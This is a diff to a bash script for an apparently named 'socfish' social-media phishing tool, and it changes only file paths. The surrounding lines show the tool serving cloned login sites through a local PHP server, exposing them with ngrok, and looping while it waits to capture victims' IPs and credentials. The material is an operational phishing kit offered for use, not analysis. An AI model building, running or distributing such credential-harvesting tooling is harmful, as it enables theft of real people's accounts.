@@ -1,7 +1,6 @@
 #!/bin/bash
 
-trap 'printf "\n";stop;exit 1' 2
-cd ~/socfish
+trap 'printf "\n";stop;exit 1'
 clear
 
 
@@ -325,12 +324,12 @@ serverx
 
 
 start() {
-if [[ -e ~/socfish/sites/$server/ip.txt ]]; then
-cd && rm -rf socfish/sites/$server/ip.txt
+if [[ -e sites/$server/ip.txt ]]; then
+rm -rf sites/$server/ip.txt
 
 fi
-if [[ -e ~/socfish/sites/$server/usernames.txt ]]; then
-cd && rm -rf socfish/sites/$server/usernames.txt
+if [[ -e sites/$server/usernames.txt ]]; then
+rm -rf sites/$server/usernames.txt
 
 fi
 
@@ -372,7 +371,7 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd ~/socfish/sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
@@ -412,16 +411,16 @@ printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting IPs and Credentials...\e[0
 while [ true ]; do
 
 
-if [[ -e "~/socfish/sites/$server/ip.txt" ]]; then
+if [[ -e "sites/$server/ip.txt" ]]; then
 printf "\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
 catch_ip
-rm -rf ~/socfish/sites/$server/ip.txt
+rm -rf sites/$server/ip.txt
 fi
 sleep 0.5
-if [[ -e "~/socfish/sites/$server/usernames.txt" ]]; then
+if [[ -e "sites/$server/usernames.txt" ]]; then
 printf "\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
 catch_cred
-rm -rf ~/socfish/sites/$server/usernames.txt
+rm -rf sites/$server/usernames.txt
 fi
 sleep 0.5
 
